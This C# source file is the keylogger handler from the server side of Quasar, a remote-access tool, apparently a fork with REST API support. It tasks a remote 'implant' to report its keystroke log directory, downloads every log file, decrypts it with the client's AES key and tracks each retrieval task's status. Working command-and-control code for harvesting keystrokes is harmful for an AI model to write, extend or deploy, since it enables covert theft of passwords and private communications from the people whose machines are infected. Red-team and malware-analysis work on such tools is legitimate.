using Quasar.Common.Helpers;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.RestApiConstants;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Server.Messages
{
    public class KeystrokeLogsTransferStatus
    {
        public const int STATUS_SUCCESS = 0;
        public const int STATUS_ERROR = 1;
        public const int STATUS_PENDING = 2;
        public const int STATUS_CANCELED = 3;
        public const int STATUS_PARTIAL_SUCCESS = 4; // in case only some keylogger files get uploaded
        public const int STATUS_PENDING_INCOMPLETE = 5; // in case only some keylogger files get uploaded

        public static bool IsValidStatus(int status)
        {
            return status <= 5 && status >= 0;
        }
    }

    public class KeystrokeLogsUploadTaskInfo
    {
        public string TaskId {get; set;} // ID string for transfer task

        public int StatusCode {get; set;}

        public string StatusMsg {get; set;}

        public string StatusErrMsg {get; set;}

        public List<int> FileTransferIds;

        public KeystrokeLogsUploadTaskInfo(string taskId)
        {
            this.TaskId = taskId;
            this.StatusCode = KeystrokeLogsTransferStatus.STATUS_PENDING;
            this.StatusMsg = "";
            this.StatusErrMsg = "";
            this.FileTransferIds = new List<int>();
        }
    }
   
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The file manager handler used to retrieve keylogger logs from the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// The remote path of the keylogger logs directory.
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// The amount of all running log transfers.
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// The amount of all completed log transfers.
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// Keeps track of all keylogger upload task IDs and the associated log transfer task info
        /// </summary>
        private readonly static Dictionary<string, KeystrokeLogsUploadTaskInfo> _logsUploadTasks = new Dictionary<string, KeystrokeLogsUploadTaskInfo>();

        /// <summary>
        /// Used in lock statements to synchronize access between different instances of keylogger handlers.
        /// </summary>
        private readonly static object _syncLock = new object();

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client, bool viaRestApi = false, string subDirectory = "Logs\\", string baseUploadsDir = "") : base(true, viaRestApi)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(
                client, 
                subDirectory: subDirectory, 
                baseUploadsDir: baseUploadsDir, 
                viaRestApi : viaRestApi, 
                keylogging: true
            );
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        public static bool KeystrokeLogsUploadTaskExists(string taskId)
        {
            lock (_syncLock)
            {
                return _logsUploadTasks.ContainsKey(taskId);
            }
        }

        public static void AddKeystrokeLogsUploadTask(KeystrokeLogsUploadTaskInfo taskInfo)
        {
            lock (_syncLock)
            {
                _logsUploadTasks[taskInfo.TaskId] = taskInfo;
            }
        }

        public static KeystrokeLogsUploadTaskInfo GetKeystrokeLogsUploadInfo(string taskId)
        {
            lock (_syncLock)
            {
                if (_logsUploadTasks.ContainsKey(taskId))
                {
                    return _logsUploadTasks[taskId];
                }
                return null;
            }
        }

        public static void UpdateKeystrokeLogsUploadStatus(string taskId, int statusCode, string msg="", string errMsg="")
        {
            if (!KeystrokeLogsTransferStatus.IsValidStatus(statusCode))
            {
                Logger.Error(String.Format("Cannot update keystroke logs upload task status for task ID {0}: invalid status code {1}", taskId, statusCode));
                return;
            }
            lock (_syncLock)
            {
                if (_logsUploadTasks.ContainsKey(taskId))
                {
                    var taskInfo = _logsUploadTasks[taskId];
                    taskInfo.StatusCode = statusCode;
                    if (!String.IsNullOrEmpty(errMsg))
                    {
                        taskInfo.StatusErrMsg += errMsg + "\n"; // append error messages
                    }
                    if (!String.IsNullOrEmpty(msg))
                    {
                        taskInfo.StatusMsg = msg;
                    }
                    return;
                }
            }
            Logger.Error(String.Format("Cannot update keystroke logs upload task status for task ID {0}: task not found", taskId));
            return;
        }

        public static void SetKeystrokeLogsUploadTransferIds(string taskId, List<int> transferIds)
        {
            lock (_syncLock)
            {
                if (_logsUploadTasks.ContainsKey(taskId))
                {
                    var taskInfo = _logsUploadTasks[taskId];
                    foreach (int i in transferIds)
                    {
                        taskInfo.FileTransferIds.Add(i);
                    }
                    return;
                }
            }
            Logger.Error(String.Format("Cannot set keystroke logs upload transfer IDs for task ID {0}: task not found", taskId));
            return;
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them. Returns the task ID for the keystroke logs upload task.
        /// </summary>
        public string RetrieveLogs()
        {
            // Generate and register new task
            KeystrokeLogsUploadTaskInfo taskInfo = new KeystrokeLogsUploadTaskInfo(System.Guid.NewGuid().ToString());
            AddKeystrokeLogsUploadTask(taskInfo);
            _client.Send(new GetKeyloggerLogsDirectory{ TaskId = taskInfo.TaskId });
            Logger.Info("Generated and tasked implant with new keystroke logs upload task with ID " + taskInfo.TaskId);
            return taskInfo.TaskId;
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            Logger.Debug("Handling GetKeyloggerLogsDirectoryResponse message for task ID " + message.TaskId);
            _remoteKeyloggerDirectory = message.LogsDirectory;
            Logger.Debug(String.Format("Client has keylogger log directory at {0}, asking client to enumerate files there.", _remoteKeyloggerDirectory));
            client.Send(new GetDirectory { TaskId = message.TaskId, RemotePath = _remoteKeyloggerDirectory, Keylogging = true});
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            string msg = $"No logs found ({value})";
            Logger.Error(msg);
            OnReport(msg);
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items, string taskId)
        {
            if (items.Length == 0)
            {
                Logger.Info("No keystroke logs found for keystroke log upload task ID " + taskId);
                UpdateKeystrokeLogsUploadStatus(taskId, KeystrokeLogsTransferStatus.STATUS_SUCCESS, msg: "No logs found");
                OnReport("No logs found");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;
            Logger.Debug(String.Format("Enumerated {0} logs in keylogger directory {1}.", _allTransfers, _remoteKeyloggerDirectory));
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));
            List<int> transferIds = new List<int>();

            foreach (var item in items)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    string msg = String.Format("Potentially malicious client has illegal characters in download directory {0}. Disconnecting.", item.Name);
                    Logger.Warn(msg);
                    UpdateKeystrokeLogsUploadStatus(taskId, KeystrokeLogsTransferStatus.STATUS_ERROR, errMsg: msg);

                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }
                string logPath = Path.Combine(_remoteKeyloggerDirectory, item.Name);
                int transferId = _fileManagerHandler.BeginDownloadFile(logPath, item.Name + ".html", true, taskId: taskId, keylogging: true);
                if (transferId < 0)
                {
                    string msg = String.Format("Failed to generate file transfer for keystroke log {0} for keystroke log upload task {1}", logPath, taskId);
                    Logger.Error(msg);
                    UpdateKeystrokeLogsUploadStatus(taskId, KeystrokeLogsTransferStatus.STATUS_PENDING_INCOMPLETE, errMsg: msg);
                    _allTransfers--;
                }
                else
                {
                    Logger.Debug(String.Format("Adding file transfer ID {0} to keystroke log upload task {1}", transferId, taskId));
                    transferIds.Add(transferId);
                }
            }
            SetKeystrokeLogsUploadTransferIds(taskId, transferIds);
            Logger.Debug(String.Format("Generated {0} file transfers out of {1} available keystroke logs.", _allTransfers, items.Length));
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            string taskId = FileManagerHandler.GetTaskIdFromTransferId(transfer.Id);
            if (String.IsNullOrEmpty(taskId))
            {
                Logger.Error(String.Format("No keystroke logs upload task found for file transfer ID {0}", transfer.Id));
                return;
            }
            if (transfer.Status == "Completed")
            {
                KeystrokeLogsUploadTaskInfo taskInfo = GetKeystrokeLogsUploadInfo(taskId);
                if (taskInfo == null)
                {
                    Logger.Error(String.Format("No keystroke logs upload task found for task ID {0}", taskId));
                    return;
                }
                try
                {
                    _completedTransfers++;
                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
                    string msg = ""; 
                    int statusCode;
                    if (_allTransfers == _completedTransfers)
                    {
                        // Finished uploading logs
                        if (taskInfo.StatusCode == KeystrokeLogsTransferStatus.STATUS_PENDING_INCOMPLETE)
                        {
                            statusCode = KeystrokeLogsTransferStatus.STATUS_PARTIAL_SUCCESS;
                            msg = "Successfully retrieved some logs";
                        }
                        else
                        {
                            statusCode = KeystrokeLogsTransferStatus.STATUS_SUCCESS;
                            msg = "Successfully retrieved all logs";
                        }
                    }
                    else
                    {
                        statusCode = taskInfo.StatusCode;
                        msg = GetDownloadProgress(_allTransfers, _completedTransfers);
                    }
                    UpdateKeystrokeLogsUploadStatus(taskId, statusCode, msg: msg);
                    Logger.Debug(String.Format("Keystroke log upload status for task ID {0}: {1}", taskId, msg));
                    OnReport(msg);
                }
                catch (Exception ex)
                {
                    Logger.Error(String.Format("Failed to decrypt and write keystroke logs for task ID {0}: {1}", taskId, ex.ToString()));
                    OnReport("Failed to decrypt and write logs");
                    string msg = "Failed to decrypt and write keystroke logs: " + ex.Message;
                    UpdateKeystrokeLogsUploadStatus(taskId, KeystrokeLogsTransferStatus.STATUS_PARTIAL_SUCCESS, errMsg: msg);
                }
            }
        }

        private static Dictionary<string, object> ConvertUploadTaskToDict(KeystrokeLogsUploadTaskInfo taskInfo)
        {
            return new Dictionary<string, object>
            {
                [RestConstants.KEYLOG_UPLOAD_TASK_ID_FIELD] = taskInfo.TaskId,
                [RestConstants.KEYLOG_UPLOAD_STATUS_CODE_FIELD] = taskInfo.StatusCode,
                [RestConstants.KEYLOG_UPLOAD_STATUS_MSG_FIELD] = taskInfo.StatusMsg,
                [RestConstants.KEYLOG_UPLOAD_STATUS_ERR_MSG_FIELD] = taskInfo.StatusErrMsg,
                [RestConstants.KEYLOG_UPLOAD_TRANSFER_IDS_FIELD] = taskInfo.FileTransferIds
            };
        }

        public static Dictionary<string, object> GetUploadInfoDict(string taskId)
        {
            var ret = new Dictionary<string, object>();
            lock (_syncLock)
            {
                if (_logsUploadTasks.ContainsKey(taskId))
                {
                    KeystrokeLogsUploadTaskInfo taskInfo = _logsUploadTasks[taskId];
                    ret = ConvertUploadTaskToDict(taskInfo);
                }
            }
            return ret;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
